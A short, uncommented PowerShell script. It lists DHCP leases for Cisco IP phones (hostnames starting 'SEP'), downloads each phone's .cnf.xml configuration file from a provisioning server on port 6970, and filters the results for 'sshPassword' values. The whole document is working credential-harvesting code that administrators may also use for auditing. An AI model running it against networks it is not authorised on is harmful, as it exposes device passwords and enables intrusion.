$dhcp='127.0.0.1'
$phones=Get-DhcpServerv4Scope -ComputerName $dhcp | foreach {Get-DhcpServerv4Lease -computername $dhcp -allleases -ScopeId ($_.ScopeId)} | where {$_.HostName -like "SEP*"}
$phones.count

foreach ($phone in $phones)
{
$clean=$phone.HostName.split('.')[0]
$xml+=(Invoke-WebRequest -Uri http://192.168.0.10:6970/$clean.cnf.xml).rawcontent
}
$xml | findstr 'sshPassword'
